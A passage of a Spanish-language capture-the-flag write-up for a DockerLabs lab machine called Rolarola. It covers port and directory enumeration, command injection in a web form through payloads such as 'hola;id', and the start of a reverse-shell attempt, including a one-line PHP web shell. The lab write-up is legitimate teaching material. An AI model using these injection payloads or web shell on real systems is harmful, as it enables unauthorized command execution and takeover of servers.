## FASE DE ENUMERACIÓN

Vamos a enumerar la máquina víctima descargada de `https://dockerlabs.es/` y de nombre Rolarola.

Su IP es `172.17.0.2`

![imagen_CTF](images/Rolarola/1.png)

Realizamos un escaneo de puertos y si hay alguno abierto comprobamos que servicios corren por él así como sus versiones por si hay alguna vulnerabilidad:

```bash
sudo nmap -sS -sCV --open -p- --min-rate 5000 172.17.0.2 -vvv -oN nmap
```
```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.66 ((Unix))
|_http-title: Mi primer web
|_http-server-header: Apache/2.4.66 (Unix)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 02:42:AC:11:00:02 (Unknown)
```


![imagen_CTF](images/Rolarola/2.png)



Solo tenemos el puerto 80 abierto corriendo HTTP, así pues sin más que hacer vamos a visitar la página



![imagen_CTF](images/Rolarola/3.png)



Vemos un panel interesante, pero antes de probar nada, realizo un fuzzing para ver si hay algo además del panel.


```bash
gobuster dir -u "http://172.17.0.2/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt, ,html
```
Vemos tres rutas:
```
/index.php            
/names.txt           
/server-status        
```

`index.php` entiendo que sea la página que visitamos antes, `server-status` normalmente no tenemos permisos para verla, pero hay que comprobarla
por si acaso y `names.txt` que suena bien.


![imagen_CTF](images/Rolarola/4.png)



Comprobando `names.txt` compruebo que está vacía y que `index.php` es la pagina de inicio, entonces voy a ver como se comporta la página.

Introduzco una frase simple `Hola hola cara cola`

![imagen_CTF](images/Rolarola/5.png)

Le doy a enviar y veo como se comporta y reporta la frase

![imagen_CTF](images/Rolarola/6.png)


Compruebo que pasa si le doy a `no tocar` y tambien nos reporta la frase

![imagen_CTF](images/Rolarola/7.png)


En un principio pensé en alguna inyeccion xss y no tuvieron exito

![imagen_CTF](images/Rolarola/8.png)


Así pues intenté inyecciones con `;` `&` ` `` ` y funcionaron:

```bash
hola;id
hola&id
hola`id`
````

dando al botón no tocar nos reporta la salida:

![imagen_CTF](images/Rolarola/9.png)

![imagen_CTF](images/Rolarola/10.png)

![imagen_CTF](images/Rolarola/11.png)

Por lo que veo se puede escapar el texto y se ejecutan los comandos, entonces vuelvo al `names.txt` y veo que la salida se imprime en ese archivo.

![imagen_CTF](images/Rolarola/11.png)

Utilicé este método para enumerar la máquina sin exito así pues decidí probar a lanzar una revershell.

1-Compruebo si dispone de wget:
![imagen_CTF](images/Rolarola/12-1.png)
![imagen_CTF](images/Rolarola/12-2.png)
![imagen_CTF](images/Rolarola/13.png)



2-hago un php malicioso en mi máquina atacante:
```bash
echo -n '<?php system($_GET["cmd"]); ?>' >cmd.php

```

![imagen_CTF](images/Rolarola/14.png)



